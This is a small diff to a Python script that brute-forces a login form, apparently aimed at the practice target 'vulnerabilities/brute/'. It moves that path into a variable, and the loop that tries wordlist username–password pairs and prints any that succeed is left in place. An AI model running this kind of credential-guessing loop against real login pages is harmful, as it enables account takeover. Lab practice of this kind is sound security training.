@@ -1,3 +1,4 @@
+bruteforce_path = 'vulnerabilities/brute/'
 success_msg = 'Welcome to the password protected area'
 
 
@@ -24,7 +25,7 @@ def attack(session, dict_user, users, dict_pass, passw):
         u = u.rstrip('\n')
         for p in passwords:
             p = p.rstrip('\n')
-            page_content = session.login('vulnerabilities/brute/', u, p)
+            page_content = session.login(bruteforce_path, u, p)
             if success_msg in page_content:
                 print("   Credentials found!\n   Username: {}\n   Password: {}\n".format(u,p))
 
